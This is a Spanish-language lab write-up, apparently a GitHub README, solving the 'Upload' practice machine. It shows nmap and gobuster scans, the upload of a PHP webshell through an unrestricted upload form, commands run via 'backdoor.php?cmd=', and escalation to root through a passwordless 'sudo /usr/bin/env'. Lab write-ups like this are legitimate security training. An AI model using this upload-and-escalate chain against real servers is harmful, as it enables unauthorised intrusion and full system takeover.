# Maquina-Upload 
## Resolviendo maquina-Upload de "El Pingüino de Mario" 

## _Paso N°:1 Escaneo con nmap. (Fase de reconocimiento)_

```bash
┌──(eze㉿kali)-[~]
└─$ nmap -A 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-20 13:43 -03
Nmap scan report for 172.17.0.2
Host is up (0.00012s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Upload here your file
|_http-server-header: Apache/2.4.52 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.41 seconds
```
>_Adjunto imagen:_
![img01](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/9af47708-694e-42e3-9381-2b7761f215d9)

## ----------------------------------------------------------------------------------------------------------------------------------

## Paso N°2: Buscamos alguna pista en la web.
### _Podemos ver que el puerto "80/tcp open http Apache httpd 2.4.52 ((Ubuntu))" esta abierto, asi que ponemos "http://172.17.0.2" en el navegador para ver que muestra:_

>_Adjunto imagen:_
![scaneo2](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/76f9e2bf-bbe7-4402-888f-60c074d548f8)
### _Al ver solo la pagina de configuracion de Apache procedemos a un escaneo de vulnerabilidades con nmap._

## Paso N°3: Escaneo de vulnerabilidades con nmap.

```bash
┌──(eze㉿kali)-[~]
└─$ nmap -sV --script=vuln 172.17.0.2 | grep -E "CVE-|Exploit|Vulnerability|OSVDB|CNVD|http-"
|       CVE-2023-25690  9.8     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  9.8     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  9.8     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  9.8     https://vulners.com/cve/CVE-2022-22720
|       CVE-2022-28615  9.1     https://vulners.com/cve/CVE-2022-28615
|       CVE-2022-22721  9.1     https://vulners.com/cve/CVE-2022-22721
|       CVE-2022-36760  9.0     https://vulners.com/cve/CVE-2022-36760
|       CVE-2024-27316  7.5     https://vulners.com/cve/CVE-2024-27316
|       CVE-2023-31122  7.5     https://vulners.com/cve/CVE-2023-31122
|       CVE-2023-27522  7.5     https://vulners.com/cve/CVE-2023-27522
|       CVE-2022-30556  7.5     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  7.5     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-26377  7.5     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  7.5     https://vulners.com/cve/CVE-2022-22719
|       CVE-2006-20001  7.5     https://vulners.com/cve/CVE-2006-20001
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
|       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-28614  5.3     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-28330  5.3     https://vulners.com/cve/CVE-2022-28330
|       CNVD-2023-93320 5.0     https://vulners.com/cnvd/CNVD-2023-93320
|       CNVD-2023-80558 5.0     https://vulners.com/cnvd/CNVD-2023-80558
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
| http-csrf: 
| http-fileupload-exploiter: 
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum:
```
>_Adjunto imagen:_
![escaneo5](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/293f4032-b235-4be6-9f75-eac8bd76415c)
## _Podemos observar varias vulnerabilidades pero hay una en particular que llama más la atencion y es la de "fileupload-exploiter", asi que procedemos a buscar con más detalle sobre eso y lo vamos hacer con gobuster._

## ----------------------------------------------------------------------------------------------------------------------------------

## Paso N°3: Enumeracion usando gobuster.
### _Usamos el comando "gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py,bak,php.bak" ._

```bash
┌──(eze㉿kali)-[~]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py,bak,php.bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,py,bak,php.bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/upload.php           (Status: 200) [Size: 1357]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1323360 / 1323366 (100.00%)
===============================================================
Finished
===============================================================
```
>_Adjunto imagen_
![imgdir](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/c031d821-a76f-47f5-99fe-a82eb06f54ad)
## _Podemos ver efectivamente que hay dos directorios interesantes para investigar, "/uploads (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/] y /upload.php (Status: 200) [Size: 1357]"_

## ----------------------------------------------------------------------------------------------------------------------------------

## Paso N°4: Usamos el directorio encontrado.

### _Usamos el "/upload" que vimos anteriormente poniendolo en la web como "http://172.17.0.2/upload.php" ,en la salida nos encontramos con un recuadro donde se pueden subir archivos, asi que vamos a intentar explotar eso:_ 

>_Adjunto imagen:_
![img6](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/b7142178-d353-419d-802d-8c2aeefd1d29) 

## _Procedemos con la subida de un archivo ".php" creado con "nano" para ver si se logra subir o no._
## _Adjunto imagen:_
![img7](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/19ff2e35-d67d-435d-9707-65a7887f45bd)

## _Seleccionamos el archivo creado con nano que se llama "info.php" y lo subimos_
![img9](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/f91342d2-c1eb-4280-991d-fcc28bfd392a)

## _Aca vemos que el archivo "info.php" se subio con exito._
![img10](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/eb6e423f-1ab6-4a1f-8fae-ff5f97b0ddce)

## _Ahora que sabemos que se pueden subir archivos vamos a subir una "backdoor.php simple" para tener una webshell_
![img13](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/f437928a-08e9-4c3c-8ce5-c1684291fd8c)
![img14](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/05a38730-402b-4ab2-aa5e-8fd4aa9acee3)

## _Pasamos a verificar si estan los archivos subidos_
>_Adjunto imagen:_
![img16](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/a6992061-a65c-4566-bb89-e984c7b94ef3)

## ----------------------------------------------------------------------------------------------------------------------------------

## Paso N°5: Uso de la webshell.

## _Una vez ya tenemos la backdoor cargada procedemos a usarla de la siguiente manera, vamos a la url y ponemos "http://172.17.0.2/uploads/backdoor.php?cmd= " y el comando "whoami" para ver si somos root_
![img17](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/3708003c-6d71-4484-973c-0a4d2de713c3)
_La salida nos muestra un "www-data" ésto indica que el comando se está ejecutando con los permisos del usuario que el servidor web (Apache, Nginx, etc.) utiliza para ejecutar scripts, entonces probamos otro comando "sudo-l" y ahora vemos que nos arroja más informacion, el resultado indica que el usuario "www-data" tiene permisos para ejecutar el comando "/usr/bin/env" como "root" sin necesidad de una contraseña (NOPASSWD)_
>_Adjunto imagen:_ 
![img19](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/e8db8a77-15e2-4a1a-8d90-80576b1fd21d)
_Asi que vamos aprovechar eso y lo vamos a utilizar para ver que nos muestra, ponemos lo siguiente: "http://172.17.0.2/uploads/backdoor.php?cmd=sudo /usr/bin/env"._
>_Adjunto imagen:_
![img21](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/864eb082-a808-4f85-94ac-f0b94fb87e45)

## ----------------------------------------------------------------------------------------------------------------------------------

## Paso N°6: Acceso "Root".

## _Y si ponemos el siguiente comando vemos que ya somos "root", "http://172.17.0.2/uploads/backdoor.php?cmd=sudo /usr/bin/env whoami"_
>_Adjunto imagen:_ 
![root](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/d440adfe-2584-41e9-9077-be5448b84c62)

## ----------------------------------------------------------------------------------------------------------------------------------

## Paso N°7: Creacion de usuario.
_En éste punto intente crear un usuario con privilegios root pero por algun motivo no pude, no se si por configuracion de la maquina o simplemente porque hice algo mal, pero de igual manera comparto los pasos realizados:_ 
>_Adjunto imagen:_ 
![img25](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/dea7c8a2-94d6-4924-865f-7d1183191b4d)
_Y acá muestro como se creo el usuario "eze" pero con permisos básicos._
>_Adjunto imagen:_ 
![img32](https://github.com/EzeTauil/Maquina-Upload/assets/118028611/42f0a2a2-43fd-42e8-a851-79f0cfdacf43)









